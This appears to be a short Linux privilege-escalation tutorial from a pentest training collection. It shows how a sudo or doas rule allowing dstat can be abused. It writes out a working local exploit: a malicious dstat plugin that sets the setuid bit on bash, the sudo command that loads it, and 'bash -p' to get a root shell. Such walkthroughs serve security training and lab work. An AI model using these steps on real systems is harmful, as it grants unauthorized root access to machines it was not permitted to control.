- Sudo dstat command might be vulnerable to privilege escalation (PrivEsc).
- **dstat** is a versatile tool for generating system resource statistics.
- It allows users to create a custom plugin and execute by adding option e.g. **`dstat --myplugin`**.

```bash
sudo -l

(ALL) NOPASSWD: /usr/bin/dstat

```

- If we can execute "**dstat**" command as root, we can gain access to privileges by using our malicious plugin.

1. we need to find **distat directory**

![Untitled](https://github.com/0xMuhammadEhab/Linux-PrivEsc/blob/main/easy/dstat/img/Untitled(3).png)

2. in our case we have  **permission** in “**/usr/local/share/dstat**” 

![Untitled](https://github.com/0xMuhammadEhab/Linux-PrivEsc/blob/main/easy/dstat/img/Untitled(4).png)

3. Create a plugin called **"dstat_exploit.py"** under **"/usr/local/share/dstat/"**

```python
import os

os.system('chmod +s /usr/bin/bash')
```

4. dstat recognizes plugins under **"/usr/local/share/dstat/"** Check if the above exploit plugin has been added by executing the following command.

```bash
dstat --list | grep exploit
```

![Untitled](https://github.com/0xMuhammadEhab/Linux-PrivEsc/blob/main/easy/dstat/img/Untitled(5).png)

5. Now execute **"dstat"** with **“—exploit”** flag (the flag name is determined by the suffix of the file name e.g. **"dstat_<plugin-name>.py"**).

```bash
sudo /usr/bin/dstat --exploit

```

The exploit plugin executed so we enter bash as root.

```bash
bash -p
```

if you you come from doas then use 

```bash
doas -u root /usr/bin/dstat --exploit
```

![Untitled](https://github.com/0xMuhammadEhab/Linux-PrivEsc/blob/main/easy/dstat/img/Untitled(6).png)
